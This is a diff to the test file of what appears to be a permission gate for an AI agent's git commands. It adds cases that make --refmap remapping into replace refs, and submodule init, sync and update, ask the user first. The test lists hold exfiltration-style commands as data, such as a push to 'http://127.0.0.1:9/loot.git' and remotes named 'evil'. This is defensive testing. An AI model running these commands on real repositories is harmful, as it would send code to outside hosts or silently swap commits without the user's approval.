@@ -909,7 +909,7 @@ test('git commands that stay in the agent’s own folder run without asking', ()
     'git fetch', 'git fetch origin', 'git fetch upstream', 'git fetch --all --prune', 'git pull', 'git pull --rebase origin main', 'git push',
     'git push origin main', 'git push -u origin feature/login', 'git push origin HEAD:refs/heads/fix', 'git push --tags', 'git push origin v1.0',
     'git push -n origin main', 'git push --no-force-with-lease origin main', 'git push -o ci.skip origin main', 'git remote -v', 'git remote show origin',
-    'git ls-remote', 'git ls-remote origin', 'git submodule update',
+    'git ls-remote', 'git ls-remote origin', 'git submodule status',
     // more folders and files of its own
     'git worktree add wt', 'git worktree list', 'git init sub', 'git archive -o out.zip HEAD', 'git format-patch -1', 'git bundle create repo.bundle HEAD',
     'git diff --output=x.patch', 'git show --outp=x', 'git apply --check list.txt',
@@ -1346,10 +1346,14 @@ test("git replace asks: it changes what every working copy shows for a commit, t
     'git update-ref refs/replace/abc123 def456', 'git update-ref --no-deref refs/replace/abc123 def456', 'git symbolic-ref refs/replace/abc123 refs/heads/x',
     "git fetch origin 'refs/replace/*:refs/replace/*'", "git fetch origin '+refs/*:refs/*'", 'git fetch origin abc:refs/replace/abc',
     "git pull origin 'refs/replace/*:refs/replace/*'",
+    // --refmap maps the refs named on the command line: refs/heads/main lands on refs/replace/main
+    "git fetch origin main --refmap='refs/heads/*:refs/replace/*'", "git fetch origin main --refmap 'refs/heads/*:refs/replace/*'",
+    "git pull origin main --refm='refs/heads/*:refs/*'",
   ].map(c => bash(c)), /show other commits in place of the ones it has/);
   assert.equal(decide({ cwd, ...bash('git replace abc123 def456') }).sentence, 'wants to make git show a different commit in place of another');
   check(['git replace', 'git replace -l', "git replace --list 'abc*'", 'git replace --format=medium', 'git replace -l --format=long',
-    'git update-ref refs/heads/x HEAD', 'git fetch origin main:refs/remotes/origin/main', 'git fetch origin main'].map(c => bash(c)), 'allow');
+    'git update-ref refs/heads/x HEAD', 'git fetch origin main:refs/remotes/origin/main', 'git fetch origin main',
+    "git fetch origin main --refmap='refs/heads/*:refs/remotes/origin/*'"].map(c => bash(c)), 'allow');
 });
 
 test('git asks before upkeep that can delete work no branch holds for good: maintenance run, repack -d, prune-packed', () => {
@@ -1368,14 +1372,19 @@ test("git that names an address or a folder instead of one of the repository's o
     'git push http://127.0.0.1:9/loot.git FETCH_HEAD:refs/heads/theirs', 'git ls-remote https://github.com/owner/repo', 'git ls-remote --sort=v:refname https://x.example/r',
     'git ls-remote elsewhere', 'git clone https://github.com/owner/repo.git', 'git clone git@github.com:owner/repo.git sub/repo', 'git clone --depth 1 -b main https://github.com/o/r',
     'git clone sub copy', 'git archive --remote=https://x.example/r.git HEAD', 'git archive --remote https://x.example/r.git HEAD', 'git archive --remote=elsewhere HEAD',
-    'git submodule add https://github.com/o/lib libs/lib', 'git submodule add ./lib libs/lib', 'git submodule init', 'git submodule sync', 'git submodule update --init',
-    'git submodule update --init --recursive', 'git submodule set-url libs/lib https://x.example/r.git', 'git remote add evil https://x.example/r.git',
+    'git submodule add https://github.com/o/lib libs/lib', 'git submodule add ./lib libs/lib', 'git remote add evil https://x.example/r.git',
     'git remote add upstream2 ssh://git@example.com/srv/repo.git', 'git remote set-url origin https://x.example/r.git', 'git remote set-url --push origin https://x.example/r.git',
     'git remote show https://x.example/r.git', 'git request-pull v1.0 https://x.example/r.git main', 'git send-pack https://x.example/r.git main', 'git fetch-pack https://x.example/r.git',
     // An option's value is never taken for the repository, nor the repository for a value: git takes a whole option name over an abbreviation.
     'git fetch --recurse-submodules evil.example:repo', 'git fetch -j 4 evil.example:repo', 'git push --recurse-submodules check evil.example:repo main',
   ].map(c => bash(c)), /not one of the repository's own remotes/);
+  // Submodules come from the addresses in .gitmodules, which the agent can change: a plain update too, since with the
+  // submodule.active setting `git clone --recurse-submodules` leaves, it clones a submodule only .gitmodules names.
+  asksBecause(['git submodule init', 'git submodule sync', 'git submodule update', 'git submodule update --init', 'git submodule update --init --recursive',
+    'git submodule --quiet update', 'git submodule update --remote', 'git submodule set-url libs/lib https://x.example/r.git'].map(c => bash(c)),
+  /addresses in the \.gitmodules file/);
   const say = command => decide({ cwd, ...bash(command) }).sentence;
+  assert.equal(say('git submodule update'), 'wants to download submodules');
   assert.equal(say('git fetch http://127.0.0.1:9/private.git main'), 'wants to download new commits from 127.0.0.1');
   assert.equal(say('git push https://github.com/owner/repo.git main'), 'wants to push main to GitHub');
   assert.equal(say('git clone https://github.com/owner/repo.git'), 'wants to download owner/repo from GitHub');
@@ -1389,7 +1398,7 @@ test("git that names an address or a folder instead of one of the repository's o
     'git pull', 'git pull --rebase origin main', 'git pull -X theirs origin main', 'git push --recurse-submodules check origin main', 'git push',
     'git push origin main', 'git push -u origin feature/login', 'git push --repo=origin', 'git push -o ci.skip origin main', 'git push origin HEAD:refs/heads/fix',
     'git ls-remote', 'git ls-remote origin', 'git ls-remote --heads origin', 'git remote -v', 'git remote show origin', 'git remote prune origin', 'git remote update',
-    'git submodule update', 'git submodule status',
+    'git submodule status', 'git submodule', 'git submodule summary',
   ].map(c => bash(c)), 'allow');
 });
 
